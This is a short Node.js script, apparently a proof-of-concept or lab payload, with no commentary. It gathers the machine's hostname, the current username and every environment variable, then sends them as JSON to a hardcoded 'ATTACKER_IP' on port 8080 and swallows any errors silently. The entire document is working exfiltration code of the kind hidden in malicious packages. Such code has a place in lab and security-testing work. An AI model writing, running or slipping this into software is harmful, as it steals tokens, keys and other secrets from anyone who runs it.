const http = require("http");
const os = require("os");

const ATTACKER_IP = "192.168.56.10";
const ATTACKER_PORT = 8080;

const gatheredData = {
  hostname: os.hostname(),
  username: os.userInfo().username,
  env_vars: process.env,
};

const payload = JSON.stringify(gatheredData);

const options = {
  hostname: ATTACKER_IP,
  port: ATTACKER_PORT,
  path: "/",
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "Content-Length": payload.length,
  },
};

const req = http.request(options, (res) => {});
req.on("error", (e) => {});
req.write(payload);
req.end();
